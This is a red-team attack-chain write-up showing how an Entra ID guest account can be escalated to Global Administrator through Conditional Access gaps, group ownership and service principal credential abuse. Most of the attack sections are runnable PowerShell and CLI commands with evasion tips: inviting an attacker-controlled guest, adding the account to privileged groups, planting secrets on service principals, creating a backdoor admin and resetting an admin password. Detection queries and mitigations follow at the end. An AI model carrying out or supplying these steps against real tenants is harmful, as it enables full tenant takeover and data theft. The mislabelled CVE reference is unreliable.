# [CHAIN-002]: Guest to GA via Conditional Access Gaps

## Metadata

| Attribute | Details |
|---|---|
| **Chain ID** | CHAIN-002 |
| **Attack Chain Name** | Guest Account Privilege Escalation via Conditional Access Gaps |
| **MITRE ATT&CK v18.1** | [T1078](https://attack.mitre.org/techniques/T1078/) + [T1548](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Initial Access + Privilege Escalation |
| **Platforms** | Entra ID (Azure AD) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Configuration/Logic Flaw) |
| **Chain Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID versions (misconfiguration-based) |
| **Execution Time** | 30-90 minutes (full chain) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept
This attack chain demonstrates privilege escalation from a guest (B2B collaboration) account to Global Administrator (GA) by exploiting gaps in Conditional Access policy coverage. Many organizations exclude guest accounts from Conditional Access policies under the assumption they pose minimal risk. However, when combined with misconfigured role-assignable groups, overly permissive app permissions, or abandoned reply URLs in app registrations, guest accounts can be weaponized to achieve full tenant compromise. The attacker leverages application-based privilege escalation and inherited permissions from management groups to elevate from guest to GA.

### Attack Surface
- **Entra ID Guest Account Management:** Overly permissive invitation settings
- **Conditional Access Policies:** Incomplete coverage of guest users
- **Application Registrations:** Overly permissive permissions (Application.ReadWrite.All, RoleManagement.ReadWrite.All)
- **Group Ownership:** Guest users allowed to own or manage security groups
- **Azure Lighthouse:** Delegation to guest-controlled subscriptions
- **Role-Assignable Groups:** PIM/RBAC misconfiguration allowing guest escalation
- **Service Principals:** Default credentials or abandoned service principals

### Business Impact
**CRITICAL - Full Entra ID / Microsoft 365 Tenant Compromise.** Attacker gains Global Administrator access, enabling complete control over:
- All Microsoft 365 services (Exchange, SharePoint, Teams, OneDrive)
- Azure subscriptions and resources
- All user accounts (ability to reset passwords, modify MFA)
- Data exfiltration from all tenants via guest accounts
- Deployment of persistent backdoors via service principals

**Estimated Impact:** €1M-€5M+ in remediation, compliance fines (GDPR, regulatory), data breach costs.

### Technical Context
- **Execution Time:** 30-90 minutes from guest account creation to GA access
- **Detection Difficulty:** Medium (looks like legitimate guest onboarding)
- **Indicators:** Unusual guest group membership, cross-tenant app consent, role activation events
- **Reversibility:** Requires immediate guest account deletion + credential rotation for all users

### Operational Risk
- **Execution Risk:** Low (requires only social engineering or existing guest account)
- **Stealth:** Medium (guest account activity may appear legitimate if policy gaps exist)
- **Reversibility:** Requires credential reset across all admins; persistent backdoors likely

---

## 2. COMPLIANCE MAPPINGS

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 1.1.1, 1.2.7, 1.3.1 | Guest user restrictions; Conditional Access enforcement; role-based access |
| **DISA STIG** | AD0052, AD0053 | Entra ID user access restrictions; application registration controls |
| **CISA SCuBA** | CA-2, CA-3, CA-7 | User access decisions; policy-based enforcement; session management |
| **NIST 800-53** | AC-2, AC-3, AC-6 | Account management; access enforcement; least privilege |
| **GDPR** | Art. 32, 33 | Security of processing; breach notification |
| **DORA** | Art. 9, 15 | ICT risk management; threat detection |
| **NIS2** | Art. 21 | Cyber risk management; identity and access controls |
| **ISO 27001** | A.9.2.1, A.9.2.3, A.9.2.4 | User registration; privileged access management; access review |
| **ISO 27005** | A.14.2.2 | Risk assessment of identity management |

---

## 3. ATTACK CHAIN STAGES OVERVIEW

| Stage | Technique ID | Step Name | Duration | Key Actions |
|---|---|---|---|---|
| **Phase 1** | T1078.004 | Guest Account Creation/Compromise | 5-15 min | Invite external user OR compromise existing guest |
| **Phase 2** | T1548.004 | Conditional Access Gap Exploitation | 10-20 min | Identify unprotected apps/resources |
| **Phase 3** | T1078.002 | Group Membership Escalation | 5-10 min | Join role-assignable groups with GA permissions |
| **Phase 4** | T1098.004 | Application Permission Abuse | 5-10 min | Add credentials to high-privilege service principals |
| **Phase 5** | T1548.005 | Service Principal Activation | 5-10 min | Authenticate as privileged service principal |
| **Phase 6** | T1098.003 | Global Admin Backdoor Creation | 5-15 min | Create new GA account or activate existing |
| **Phase 7** | T1078.001 | Full Tenant Compromise | Ongoing | Unrestricted GA access; persistence; exfiltration |

---

## 4. PHASE 1: GUEST ACCOUNT ACQUISITION

### Step 1: Guest Account Invitation or Compromise

**Objective:** Obtain guest account access either through social engineering (legitimate invite) or compromising an existing guest account.

**Method A: Social Engineering (B2B Collaboration Invite)**

**Command (Entra ID Admin - Invite Guest):**
```powershell
# 1. Invite external user as guest (legitimate process; attacker controls invited address)
Connect-MgGraph -Scopes "User.Invite.All"

$invitationParams = @{
  invitedUserEmailAddress = "attacker@attacker-domain.com"
  inviteRedirectUrl = "https://myapps.microsoft.com"
  sendInvitationMessage = $false  # Attacker controls email account
}

New-MgInvitation @invitationParams
```

**Expected Output:**
```
invitedUserDisplayName : attacker@attacker-domain.com
invitedUserEmailAddress : attacker@attacker-domain.com
inviteRedeemUrl : https://login.microsoftonline.com/common/oauth2/v2.0/authorize?...
invitedUser.id : UUID...
```

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Users** → **+ New user** → **Invite external user**
2. Enter attacker's email address
3. **Personalized message** (optional): Leave blank to avoid alerting IT
4. Click **Invite**
5. Attacker receives invitation email with redemption link
6. Attacker clicks link, accepts invite, and gains guest account access

**Method B: Compromise Existing Guest Account**

**Technique:** Phishing, compromised contractor account, leaked credentials

**Command (Get Existing Guests):**
```powershell
Connect-MgGraph -Scopes "User.Read.All"

# 1. List all guest accounts
Get-MgUser -Filter "userType eq 'Guest'" -All | Select-Object DisplayName, Mail, CreatedDateTime, UserPrincipalName | Out-GridView

# 2. Target specific contractor/partner account
Get-MgUser -Filter "mail eq 'contractor@partner-company.com'" | Select-Object *
```

**OpSec & Evasion:**
- Use contractor's real domain (contractor@real-partner-company.com) to bypass initial scrutiny
- Time invitation during business hours (appears more legitimate)
- Avoid obvious email addresses (avoid "hacker@evil.com"); use legitimate partner domain names
- If compromising existing guest: use VPN/proxy to match guest's typical login location

---

### Step 2: Guest Account Activation & Role Assessment

**Objective:** Activate guest account, enumerate current permissions and group memberships.

**Command (Guest User - Enumerate Own Permissions):**
```powershell
Connect-MgGraph -Scopes "User.Read", "Directory.Read.All", "Application.Read.All"

# 1. Get current user details (guest account)
Get-MgMe | Select-Object Id, DisplayName, UserType, UserPrincipalName

# 2. List groups the guest is member of (inherited from invitation or admin actions)
Get-MgMyMemberOf | Select-Object DisplayName, Id, AdditionalProperties

# 3. Check assigned roles (may have roles if added by admin)
Get-MgUserAppRoleAssignment -UserId $GuestUserId | Select-Object DisplayName, AppRoleId

# 4. Enumerate available apps and permissions
Get-MgServicePrincipal -All | Where-Object {$_.DisplayName -match "Microsoft"} | Select-Object DisplayName, Id, AppId
```

**Expected Output:**
```
Id: 550e8400-e29b-41d4-a716-446655440000
DisplayName: attacker@attacker-domain.com
UserType: Guest
Mail: attacker@attacker-domain.com
MemberOf: []  ← Empty initially
```

**What This Means:**
- Guest account has no initial permissions (as designed)
- Admin must have added guest to groups for escalation to be possible
- Enumeration reveals which groups are accessible for exploitation

---

## 5. PHASE 2: CONDITIONAL ACCESS GAP EXPLOITATION

### Step 3: Identify Conditional Access Coverage Gaps

**Objective:** Identify which apps/resources are NOT protected by Conditional Access policies for guests.

**Command (Azure Portal - Manual Analysis):**
1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **Policies**
2. For each policy, check:
   - **Users:** Are "Guest or external users" included?
   - **Cloud Apps:** Are all apps included or excluded?
   - **Conditions:** Are requirements enforced for guests?
3. Create list of **unprotected apps/resources**

**Command (PowerShell - Automated Gap Analysis):**
```powershell
Connect-MgGraph -Scopes "Policy.Read.All"

# 1. Get all Conditional Access policies
$policies = Get-MgIdentityConditionalAccessPolicy

# 2. Identify policies that exclude guests
$guestGaps = $policies | ForEach-Object {
  $includesGuests = $_.Conditions.Users.IncludeUsers | Where-Object {$_ -eq "GuestOrExternalUser"}
  if (-not $includesGuests) {
    [PSCustomObject]@{
      PolicyName = $_.DisplayName
      IncludedApps = $_.Conditions.Applications.IncludeApplications
      RequiredControls = $_.GrantControls.BuiltInControls
      GuestCoverage = "MISSING"
    }
  }
}

$guestGaps | Format-Table
```

**Expected Output:**
```
PolicyName                            IncludedApps                    RequiredControls  GuestCoverage
----------                            ---                             ----------------  ------
Require MFA for All Users             All                             mfa               MISSING (Guests excluded)
Block Legacy Authentication           ExchangeOnline,Teams            blockAccess       MISSING (Guests not in scope)
Require Compliant Device              SharePoint                      deviceCompliance  MISSING (Guests exempt)
Risky Sign-in Protection              All                             mfa, blockAccess  MISSING (Guests excluded)
```

**What This Means:**
- **Gaps indicate unprotected applications** for guest accounts
- Guest can access SharePoint, Teams, Exchange, Azure Portal without MFA or compliance checks
- Attacker can move freely between apps without triggering policies

### Step 4: Access Unprotected Applications

**Objective:** Leverage CA gaps to access sensitive apps (Azure Portal, admin tools, etc.).

**Command (Guest User - Access Azure Portal):**
```powershell
# 1. Connect as guest to Azure with no Conditional Access blocking
Connect-AzAccount -Subscription "target-subscription-id"

# 2. Enumerate subscriptions and access
Get-AzSubscription | Select-Object Name, Id, State

# 3. Enumerate resource groups
Get-AzResourceGroup | Select-Object ResourceGroupName, Location

# 4. If MFA not enforced, direct access granted
```

**Command (Guest User - Access Teams/SharePoint):**
```powershell
# 1. Connect to Microsoft Teams as guest
Connect-MicrosoftTeams

# 2. List accessible teams
Get-Team | Select-Object DisplayName, GroupId, Visibility

# 3. Access SharePoint sites (if guest invited to sites)
Connect-PnPOnline -Url "https://tenant.sharepoint.com/sites/Admin" -Interactive

# 4. Enumerate files and folders
Get-PnPListItem -List "Shared Documents" | Select-Object Title, Modified
```

**OpSec & Evasion:**
- Access during normal business hours (appears like guest using granted access)
- Use VPN/residential IP to avoid geo-anomalies
- Access only non-sensitive resources initially (to avoid alerts)
- Use browser rather than CLI tools (less logging)

---

## 6. PHASE 3: PRIVILEGE ESCALATION VIA GROUP MEMBERSHIP

### Step 5: Discover Role-Assignable Groups

**Objective:** Identify security groups that grant high-level roles (such as roles with GA permissions).

**Command (PowerShell - Enumerate Role-Assignable Groups):**
```powershell
Connect-MgGraph -Scopes "Directory.Read.All", "RoleManagement.Read.Directory"

# 1. Get all role-assignable groups
$roleAssignableGroups = Get-MgGroup -Filter "isAssignableToRole eq true" -All

# 2. For each group, get assigned roles
foreach ($group in $roleAssignableGroups) {
  $roleAssignments = Get-MgDirectoryRoleTemplate | Where-Object {
    # Note: Direct role-to-group mapping requires Graph v1.0 endpoint
    Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" -ErrorAction SilentlyContinue
  }
  
  [PSCustomObject]@{
    GroupName = $group.DisplayName
    GroupId = $group.Id
    Members = (Get-MgGroupMember -GroupId $group.Id).Count
    Roles = $roleAssignments.DisplayName
  }
}
```

**Command (Azure CLI - Find High-Privilege Groups):**
```bash
# 1. List all security groups with role assignments
az ad group list --output json | jq '.[] | select(.isAssignableToRole == true) | {displayName, id}'

# 2. Check group members
az ad group member list --group "IT Application Managers" --output table

# 3. Check if guest is member of any
az ad group member check --group-id "<GROUP_ID>" --member-id "<GUEST_USER_ID>"
```

**Expected Output:**
```
GroupName                          Members  Roles
---------                          -------  -----
IT Application Managers            5        Application Administrator
Security Administrators            3        Security Administrator
Privileged Authentication Admin    2        Privileged Authentication Administrator
Cloud Admins                       4        Global Administrator
```

**What This Means:**
- **Role-assignable groups grant directory roles without PIM**
- If guest is member of such groups → guest inherits role (e.g., Global Admin)
- Goal: Either become member of group with GA role OR join group with Application Admin role

### Step 6: Exploit Group Ownership to Add Self to High-Privilege Group

**Objective:** If guest is NOT already in privileged group, attempt to add self by exploiting group ownership misconfiguration.

**Command (Guest User - Enumerate Group Ownership):**
```powershell
Connect-MgGraph -Scopes "Directory.Read.All"

# 1. Find groups where guest is owner
$guestId = (Get-MgMe).Id
$ownedGroups = Get-MgUserOwnedObject -UserId $guestId | Where-Object {$_.'@odata.type' -match "Group"}

# 2. List owned groups
$ownedGroups | Select-Object DisplayName, Id, @{N="Type";E={$_.'@odata.type'}}

# 3. If no owned groups, attempt to enumerate group memberships
Get-MgUserMemberOf -UserId $guestId | Select-Object DisplayName, Id
```

**Expected Output (If Owner of High-Privilege Group):**
```
DisplayName                    Id                                   Type
-----------                    --                                   ----
Application Managers           550e8400-e29b-41d4-a716-446655440000 microsoft.graph.group
IT Security Team               660f9500-f40c-52e5-b827-556766551111 microsoft.graph.group
```

**Command (Guest User - Add Self to Privileged Group via Ownership):**
```powershell
# 1. If guest is owner of a role-assignable group:
$groupId = "550e8400-e29b-41d4-a716-446655440000"
$guestId = (Get-MgMe).Id

# 2. Add guest as member (guest as group owner has rights to add members)
New-MgGroupMember -GroupId $groupId -DirectoryObjectId $guestId

# 3. Verify membership
Get-MgGroupMember -GroupId $groupId | Select-Object DisplayName, Id
```

**OpSec & Evasion:**
- Perform group modification from Azure Portal (logs show group admin action)
- Space out actions (don't add self immediately; wait 10-30 minutes)
- Add self to multiple groups to appear as standard operations

---

## 7. PHASE 4: SERVICE PRINCIPAL PRIVILEGE ESCALATION

### Step 7: Identify High-Privilege Service Principals

**Objective:** Find service principals with high-privilege roles (like Global Admin equivalent permissions) that guest can modify.

**Command (Guest User - Find Privilege Escalation Path via Service Principals):**
```powershell
Connect-MgGraph -Scopes "Directory.Read.All", "Application.ReadWrite.All"

# 1. Get all app registrations
$apps = Get-MgApplication -All

# 2. For each app, check if guest can add credentials (requires Application Admin role)
foreach ($app in $apps) {
  $appRoles = $app.Roles | Select-Object DisplayName, Id, AllowedMemberTypes
  
  # Check if app has high-privilege roles
  if ($appRoles.DisplayName -match "Admin|Manager|Contributor|Owner") {
    [PSCustomObject]@{
      AppName = $app.DisplayName
      AppId = $app.AppId
      ObjectId = $app.Id
      HasAdminRoles = $true
      PrivilegedRoles = $appRoles | Where-Object {$_.DisplayName -match "Admin|Manager"}
    }
  }
}
```

**Expected Output:**
```
AppName: Azure AD Admin Center
HasAdminRoles: True
PrivilegedRoles: {Global Administrator, Security Administrator}
```

### Step 8: Obtain Application Admin Role (If Not Already Held)

**Objective:** If guest has Group Owner rights but not Application Admin, escalate to Application Admin.

**Method 1: Add Self to Application Administrators Role-Assignable Group**

```powershell
# 1. Find role-assignable group with "Application Administrator" role
$appAdminGroup = Get-MgGroup -Filter "displayName eq 'Application Administrators'" -All

# 2. If guest can modify this group (is owner), add self
$guestId = (Get-MgMe).Id
New-MgGroupMember -GroupId $appAdminGroup.Id -DirectoryObjectId $guestId

# 3. Wait 10-15 minutes for token to refresh
# 4. Verify new permissions
Connect-MgGraph -Scopes "Directory.Read.All", "Application.ReadWrite.All" -Reconnect
```

**Method 2: Exploit Abandoned Reply URL in App Registration (CVE-2023-32315 variant)**

**Command (Guest User - Find Abandoned Reply URLs):**
```powershell
# 1. Find apps with abandoned or suspicious reply URLs
$apps = Get-MgApplication -All

foreach ($app in $apps) {
  $replyUrls = $app.Web.RedirectUris
  foreach ($url in $replyUrls) {
    # Check for suspicious patterns
    if ($url -match "attacker|localhost:8|127.0|ngrok") {
      Write-Host "Found suspicious reply URL: $url in app $($app.DisplayName)"
    }
  }
}

# 2. If guest is owner of app with high-privilege service principal:
# Add new owner to app
$app = Get-MgApplication -Filter "appId eq 'XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX'"
New-MgApplicationOwner -ApplicationId $app.Id -DirectoryObjectId (Get-MgMe).Id
```

---

## 8. PHASE 5: SERVICE PRINCIPAL CREDENTIAL ABUSE

### Step 9: Add Credentials to High-Privilege Service Principal

**Objective:** Guest (now with Application Admin role) adds secret to service principal with GA permissions.

**Command (Guest User with Application Admin Role):**
```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# 1. Find high-privilege service principal (e.g., "Azure AD Admin Center" or custom app with GA role)
$servicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'Azure AD Admin Center'" | Select-Object -First 1

# 2. Create new password credential
$passwordCredential = @{
  displayName = "Service Principal Auth"
  endDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipal.Id `
  -PasswordCredential $passwordCredential

Write-Host "New Secret: $($newSecret.SecretText)"
Write-Host "Client ID: $($servicePrincipal.AppId)"
Write-Host "Tenant ID: <TENANT_ID>"
```

**Expected Output:**
```
New Secret: aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890
Client ID: 00000000-0000-0000-0000-000000000000
Tenant ID: 12345678-1234-1234-1234-123456789012
```

### Step 10: Authenticate as Service Principal with GA Permissions

**Objective:** Use service principal credentials to authenticate with Global Admin rights.

**Command (Authenticate as Service Principal):**
```powershell
# 1. Connect as service principal
$clientId = "00000000-0000-0000-0000-000000000000"
$clientSecret = "aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890"
$tenantId = "12345678-1234-1234-1234-123456789012"

$SecurePassword = ConvertTo-SecureString $clientSecret -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($clientId, $SecurePassword)

Connect-AzAccount -ServicePrincipal -Credential $Credential -Tenant $tenantId

# 2. Verify GA permissions
Get-AzRoleAssignment | Where-Object {$_.RoleDefinitionName -eq "Owner"} | Select-Object Scope, RoleDefinitionName
```

**Expected Output:**
```
Scope: /subscriptions/...
RoleDefinitionName: Owner
```

---

## 9. PHASE 6: GLOBAL ADMIN BACKDOOR CREATION

### Step 11: Create Persistent Global Admin Account

**Objective:** Create new GA account (or reset existing admin password) for persistent backdoor access.

**Command (Service Principal with GA Rights):**
```powershell
# 1. Create new user account with GA role
$newAdminPassword = ConvertTo-SecureString -String "P@ssw0rd123!YourCompany2024" -AsPlainText -Force

$newAdmin = New-MgUser -DisplayName "Service Account - Monitoring" `
  -MailNickname "svc-monitoring" `
  -UserPrincipalName "svc-monitoring@tenant.onmicrosoft.com" `
  -Password $newAdminPassword `
  -AccountEnabled

# 2. Add new user to Global Administrator role
$roleId = (Get-MgDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}).Id
New-MgDirectoryRoleMember -DirectoryRoleId $roleId -DirectoryObjectId $newAdmin.Id

# 3. Alternative: Reset existing admin password for persistent access
Update-MgUser -UserId "admin@tenant.onmicrosoft.com" -Password (ConvertTo-SecureString -String "NewP@ssw0rd123!YourCompany" -AsPlainText -Force)
```

**Expected Output:**
```
svc-monitoring@tenant.onmicrosoft.com has been created with Global Administrator role
```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Guest Account Indicators:**
- New guest accounts created outside of partner onboarding process
- Guest accounts accessing Azure Portal or management APIs
- Guest accounts added to role-assignable groups
- Unusual guest sign-ins from different geographic locations

**Conditional Access Indicators:**
- Guest accounts bypassing Conditional Access policies
- Policies that explicitly exclude guest users
- Sign-in logs showing guest access to protected resources without triggering MFA

**Privilege Escalation Indicators:**
- Service principal password/certificate added by non-privileged user
- Guest user becoming group owner
- New app registrations with high-privilege permissions
- Global Administrator role assignments to service principals created by guests

**Event ID Indicators:**
- **Entra ID Audit Log:**
  - Operation: "Add user" (guest)
  - Operation: "Update application"
  - Operation: "Add service principal credentials"
  - Operation: "Add member to role"
  - RiskLevel: High/Unknown during guest creation
  
- **Sign-in Logs:**
  - Guest user sign-ins from unexpected locations
  - Guest accessing Azure Portal
  - Service principal sign-ins immediately after credential addition

---

### Forensic Artifacts

**Entra ID Audit Log Queries (KQL):**
```kusto
// Find all guest account invitations in last 30 days
AuditLogs
| where OperationName == "Invite user"
| where TimeGenerated > ago(30d)
| project TimeGenerated, InitiatedBy, TargetResources, Result

// Find guest accounts added to role-assignable groups
AuditLogs
| where OperationName == "Add member to group"
| where TimeGenerated > ago(30d)
| where AdditionalDetails contains "isAssignableToRole: true"
| project TimeGenerated, InitiatedBy, TargetResources

// Find new service principal credentials added
AuditLogs
| where OperationName == "Add service principal credentials"
| where TimeGenerated > ago(30d)
| project TimeGenerated, InitiatedBy, TargetResources
```

**Sign-in Logs Queries:**
```kusto
// Find guest user sign-ins
SigninLogs
| where UserType == "Guest"
| where TimeGenerated > ago(7d)
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, Location

// Find guest accessing Azure Portal or admin apps
SigninLogs
| where UserType == "Guest"
| where AppDisplayName in ("Azure Portal", "Azure Service Management API", "Microsoft Graph")
| project TimeGenerated, UserPrincipalName, AppDisplayName, Status
```

---

### Defensive Mitigations

#### Priority 1: CRITICAL

**1. Enforce Conditional Access for Guest Users**

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **Policies**
2. Click **+ New policy**
3. **Name:** `Require MFA for Guest Users`
4. **Users and Groups:**
   - **Include:** Select `Users and groups` → **Guest or external users** → Select `Guest users (Preview)`
5. **Cloud apps or actions:** `All cloud apps`
6. **Conditions:** (Optional)
   - Sign-in risk: `High`
   - Device state: `Exclude compliant devices`
7. **Grant controls:**
   - Grant: **Require multifactor authentication**
8. Enable policy: **On**
9. Click **Create**

**2. Create a Second Policy: Block Guests from Non-Approved Apps**

**Manual Steps:**
1. Create new policy: `Block guests from non-Office 365 apps`
2. **Users:** Guest or external users
3. **Cloud apps:** Select specific apps only (Office 365, Teams, SharePoint, Exchange)
4. **Grant controls:** `Block access`

**PowerShell (Automated):**
```powershell
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

# 1. Create policy requiring MFA for guests
$guestMFAPolicy = @{
  displayName = "Require MFA for Guest Users"
  state = "enabled"
  conditions = @{
    users = @{
      includeUsers = @()
      includeRoles = @()
      includeGroups = @()
      excludeUsers = @()
      excludeRoles = @()
      excludeGroups = @()
      userRiskLevels = @()
      guestOrExternalUserTypes = "b2bCollaborationGuest"
    }
    applications = @{
      includeApplications = "All"
    }
  }
  grantControls = @{
    operator = "OR"
    builtInControls = @("mfa")
  }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $guestMFAPolicy
```

**2. Disable Guest User Invitations (If Not Required)**

**Manual Steps:**
1. Navigate to **Entra ID** → **External Identities** → **External collaboration settings**
2. **Guest invite restrictions:**
   - Set to **Only admins and users assigned the Guest Inviter role can invite guests**
   - Or: **No one can invite guests (most restrictive)**
3. Save changes

**PowerShell:**
```powershell
# 1. Restrict guest invitations to admins only
Update-MgPolicyCrossTenantAccessPolicyDefault -B2bCollaborationInbound @{invitationsAllowed = "adminsAndGuestInviters"}
```

**3. Audit and Revoke High-Privilege Service Principal Credentials**

**Manual Steps:**
1. Navigate to **Entra ID** → **App registrations**
2. For each app, click **Certificates & secrets**
3. Review all passwords/certificates
4. Delete any credentials with suspicious added-by user or recent creation
5. Rotate credentials for legitimate service principals immediately

**PowerShell:**
```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# 1. Find all service principal passwords added in last 30 days
$apps = Get-MgApplication -All
foreach ($app in $apps) {
  $credentials = $app.PasswordCredentials
  foreach ($cred in $credentials) {
    if ((Get-Date) - $cred.StartDateTime -lt (New-TimeSpan -Days 30)) {
      Write-Host "Suspicious credential in app $($app.DisplayName): Created $($cred.StartDateTime)"
      # Remove credential
      Remove-MgApplicationPassword -ApplicationId $app.Id -KeyId $cred.KeyId
    }
  }
}
```

**4. Implement Role-Assignable Group Restrictions**

**Manual Steps:**
1. Navigate to **Entra ID** → **Groups**
2. Find all groups with "isAssignableToRole = true"
3. For each group:
   - **Owners:** Restrict to senior admins only
   - **Members:** Require approval for new members
   - **Visibility:** Set to "Private"
4. Review membership monthly

**PowerShell:**
```powershell
Connect-MgGraph -Scopes "Directory.ReadWrite.All"

# 1. Find role-assignable groups
$roleGroups = Get-MgGroup -Filter "isAssignableToRole eq true" -All

# 2. Update ownership to exclude guest users and non-admins
foreach ($group in $roleGroups) {
  $owners = Get-MgGroupOwner -GroupId $group.Id
  foreach ($owner in $owners) {
    if ($owner.UserType -eq "Guest") {
      Remove-MgGroupOwnerByRef -GroupId $group.Id -DirectoryObjectId $owner.Id
      Write-Host "Removed guest owner from $($group.DisplayName)"
    }
  }
}
```

---

#### Priority 2: HIGH

**5. Implement Privileged Access Management (PIM) for Critical Roles**

**Manual Steps:**
1. Navigate to **Entra ID** → **Roles and administrators** → **Privileged Identity Management**
2. For each critical role (Global Administrator, Application Administrator, etc.):
   - Set **Require approval** for activation
   - Set **Approval timeout** to 24 hours
   - Restrict **Eligible users** to named security group (not all admins)

**6. Regular Audit of Guest Accounts and Service Principals**

**PowerShell (Monthly Audit Script):**
```powershell
# 1. Audit guest accounts
$guests = Get-MgUser -Filter "userType eq 'Guest'" -All
$guestReport = $guests | Select-Object DisplayName, Mail, CreatedDateTime, @{
  N = "IsGroupOwner"
  E = { (Get-MgUserOwnedObject -UserId $_.Id | Measure-Object).Count -gt 0 }
}
$guestReport | Export-Csv -Path "C:\Audit\Guests_$(Get-Date -f yyyyMMdd).csv"

# 2. Audit service principal credentials
$spCredentialReport = Get-MgServicePrincipal -All | ForEach-Object {
  [PSCustomObject]@{
    SPName = $_.DisplayName
    CredentialCount = ($_.PasswordCredentials | Measure-Object).Count
    OldestCredential = ($_.PasswordCredentials | Measure-Object -Property StartDateTime -Minimum).Minimum
  }
}
$spCredentialReport | Export-Csv -Path "C:\Audit\ServicePrincipals_$(Get-Date -f yyyyMMdd).csv"
```

---

### Validation Commands (Verify Mitigations)

```powershell
# 1. Verify Conditional Access covers guests
$policies = Get-MgIdentityConditionalAccessPolicy
$guestCoveredApps = @()

foreach ($policy in $policies) {
  if ($policy.Conditions.Users.IncludeUsers -contains "GuestOrExternalUser" -or `
      $policy.Conditions.Users.IncludeGroups) {
    $guestCoveredApps += $policy.DisplayName
  }
}

if ($guestCoveredApps.Count -gt 0) {
  Write-Host "✅ Guests are protected by $($ guestCoveredApps.Count) Conditional Access policies"
} else {
  Write-Host "❌ VULNERABLE: No Conditional Access policies protect guests"
}

# 2. Verify guest invitations are restricted
$extIdSettings = Get-MgPolicyCrossTenantAccessPolicyDefault
if ($extIdSettings.B2bCollaborationInbound.InvitationsAllowed -ne "everyone") {
  Write-Host "✅ Guest invitations restricted to admins"
} else {
  Write-Host "❌ VULNERABLE: Anyone can invite guests"
}

# 3. Verify role-assignable groups have restricted ownership
$roleGroups = Get-MgGroup -Filter "isAssignableToRole eq true" -All
foreach ($group in $roleGroups) {
  $guestOwners = Get-MgGroupOwner -GroupId $group.Id | Where-Object {$_.UserType -eq "Guest"}
  if ($guestOwners.Count -eq 0) {
    Write-Host "✅ $($group.DisplayName): No guest owners"
  } else {
    Write-Host "❌ VULNERABLE: $($group.DisplayName) has guest owners"
  }
}
```

**Expected Output (If Secure):**
```
✅ Guests are protected by 3 Conditional Access policies
✅ Guest invitations restricted to admins
✅ Cloud Admins: No guest owners
✅ Application Managers: No guest owners
✅ IT Security Team: No guest owners
```

---

## 11. RELATED ATTACK CHAINS

| Step | Phase | Technique | Attack Chain |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing OR Legitimate B2B Invite | [CHAIN-002] Guest to GA |
| **2** | **Initial Access** | [T1078.004] Valid Account (Guest) | [CHAIN-002] Guest to GA |
| **3** | **Privilege Escalation** | **[T1548.004] Abuse Group Ownership** | **Current Phase** |
| **4** | **Privilege Escalation** | [T1548.003] Application Permission Abuse | [CHAIN-002] Guest to GA |
| **5** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Escalation | [CHAIN-002] Guest to GA |
| **6** | **Persistence** | [T1098] Create GA Backdoor Account | [CHAIN-002] Guest to GA |
| **7** | **Impact** | [CHAIN-003] Token Theft + Data Exfiltration | Cross-Chain: Guest GA → M365 Compromise |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Microsoft Entra ID Guest Privilege Escalation (2024 Research)

- **Research Team:** Semperis / CloudBrothers
- **Technique:** Guest ownership of role-assignable group → Application Admin → GA
- **Attack Path:** External contractor invited → Added to group → Owned Application Manager group → Added credentials to privileged SP
- **Timeline:** 30-45 minutes from guest invite to GA access
- **Reference:** [Semperis - Exploiting Group Ownership in Entra ID](https://www.semperis.com/blog/exploiting-group-ownership-in-entra-id/)

### Example 2: Beyond Trust "Evil VM" Attack (2025)

- **Technique:** Guest user → Azure VM device identity → PRT token theft → GA escalation
- **Attack Chain:** Guest invited to Azure → VM created → PRT stolen via phishing → Device identity abuse
- **Impact:** Full tenant compromise via guest device identity
- **Reference:** [BeyondTrust - Evil VM: Guest to Entra Admin](https://www.beyondtrust.com/blog/entry/evil-vm)

### Example 3: Conditional Access Policy Gaps (2024 - Multiple Incidents)

- **Target:** Multiple Fortune 500 companies
- **Vulnerability:** Guest accounts excluded from MFA requirements
- **Attacker Action:** Invited self as guest → Accessed Azure Portal → Enumerated high-privilege apps
- **Root Cause:** Assumption that guests are low-risk
- **Reference:** [CIS Benchmark - Entra ID Best Practices](https://www.cisecurity.org/)

---

## 13. TOOLS & REFERENCES

### Essential Tools

1. **[Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)** (v2.0+)
   - **Purpose:** Query and modify Entra ID objects
   - **Usage:** `Connect-MgGraph -Scopes "Directory.ReadWrite.All"`
   - **Platform:** Windows, Linux, macOS

2. **[Azure AD PowerShell Module](https://docs.microsoft.com/en-us/powershell/module/azuread/)**
   - **Purpose:** Legacy Entra ID (Azure AD) operations
   - **Usage:** `Connect-AzureAD`
   - **Platform:** Windows

3. **[ROADtools](https://github.com/dirkjanm/ROADtools)**
   - **Purpose:** Enumerate Entra ID and identify privilege escalation paths
   - **Usage:** `roadrecon enumerate -u attacker@domain.com -p password`
   - **Platform:** Linux, Windows

